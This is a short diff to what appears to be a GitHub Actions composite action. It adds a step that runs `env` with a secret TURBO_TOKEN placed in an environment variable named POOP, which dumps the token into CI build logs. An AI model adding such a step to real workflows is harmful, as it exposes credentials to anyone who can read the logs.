@@ -31,6 +31,10 @@ runs:
     - shell: bash
       run: env
       env:
+        POOP: ${{ steps.secrets.outputs.TURBO_TOKEN }}
+    - shell: bash
+      run: env
+      env:
         TEST: ${{ inputs.build-args }}
 
         
